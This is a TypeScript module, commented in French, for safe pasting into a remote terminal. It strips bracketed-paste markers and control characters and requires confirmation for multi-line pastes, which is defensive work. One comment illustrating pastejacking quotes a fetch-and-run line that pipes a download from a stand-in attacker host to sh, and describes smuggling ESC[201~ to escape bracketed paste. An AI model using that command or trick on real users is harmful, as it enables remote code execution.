// Décision de collage sûr dans un terminal distant.
//
// Le collage applicatif doit passer par `term.paste()`, qui encadre le texte en
// « bracketed paste » (ESC[200~ … ESC[201~) lorsque le shell distant l'a demandé
// (DECSET 2004). Ce module décide, testable sans terminal, de ce qui part
// (texte purgé des caractères de contrôle) et s'il faut confirmer ce collage,
// en annonçant combien de lignes.

/** Vrai si le texte contient un saut de ligne, donc au moins une commande qui
 *  s'exécuterait sans validation manuelle une fois collée. C'est le signal d'un
 *  collage à confirmer : une page web hostile peut déposer dans le presse-papiers
 *  « commande\ncurl http://evil|sh\n » pour faire exécuter la seconde ligne à
 *  l'insu de l'utilisateur (pastejacking). Le bracketed paste ne neutralise
 *  l'exécution automatique que si le distant l'a activé ET que le texte ne
 *  referme pas lui-même le bloc : xterm 6 encadre sans filtrer, et un
 *  « ESC[201~ » glissé dans le presse-papiers rendait la suite exécutable
 *  (audit sécurité du front du 12 septembre 2026, FS-1). `effectuerCollage`
 *  retire donc ces séquences avant tout ; la confirmation reste la défense qui
 *  tient quand le distant n'a pas demandé le bracketed paste. */
export function collageAValider(texte: string): boolean {
  return /[\r\n]/.test(texte);
}

/** Nombre de lignes qu'un collage produira (0 pour une chaîne vide, au moins 1
 *  sinon). Sert uniquement au libellé de la confirmation. Un saut final ne crée
 *  pas de ligne vide de plus : « a\n » compte pour une ligne. */
export function nombreLignesCollage(texte: string): number {
  if (texte === "") return 0;
  return texte.replace(/[\r\n]+$/, "").split(/\r\n|\r|\n/).length;
}

/** Dépendances d'un collage, injectées pour rester testable sans terminal ni DOM. */
export interface CollageDeps {
  /** Colle le texte — en production, toujours `term.paste()` (bracketed paste). */
  coller: (texte: string) => void;
  /** Demande confirmation pour un collage de `n` lignes ; `true` = poursuivre. */
  confirmer: (n: number) => Promise<boolean>;
}

/** Effectue un collage sûr : rien sur une chaîne vide, confirmation avant un
 *  collage multi-ligne, puis `coller`. Sépare la DÉCISION (testée ici) du
 *  câblage (term.paste / askConfirm, dans main.ts) — garantit qu'aucun chemin ne
 *  peut coller sans passer par `coller`, ni court-circuiter la confirmation. */
export async function effectuerCollage(brut: string, deps: CollageDeps): Promise<void> {
  const texte = sansCaracteresDeControle(brut);
  if (!texte) return;
  if (collageAValider(texte) && !(await deps.confirmer(nombreLignesCollage(texte)))) return;
  deps.coller(texte);
}

/** Retire du texte collé les caractères de contrôle C0 et C1 (et DEL), sauf la
 *  tabulation, le retour chariot et le saut de ligne, qui sont du texte.
 *
 *  Audit sécurité du front du 12 septembre 2026 (FS-1). Les marqueurs de
 *  bracketed paste (« ESC[200~ », « ESC[201~ », et leur forme CSI 8 bits
 *  U+009B) partent entiers : retirer seulement ESC laisserait « [201~ » dans la
 *  commande. Le reste (séquences OSC, BEL, retour arrière, DEL qui efface ce que
 *  la modale aurait annoncé) n'a rien à faire dans un collage : aucun
 *  presse-papiers honnête n'en porte. */
function sansCaracteresDeControle(texte: string): string {
  // Classes de caractères de contrôle voulues : c'est l'objet même de la
  // fonction (même justification que la surcharge de filters.ts).
  // eslint-disable-next-line no-control-regex
  const marqueurs = /(?:\u001b\[|\u009b)20[01]~/g;
  // eslint-disable-next-line no-control-regex
  const controles = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g;
  return texte.replace(marqueurs, "").replace(controles, "");
}
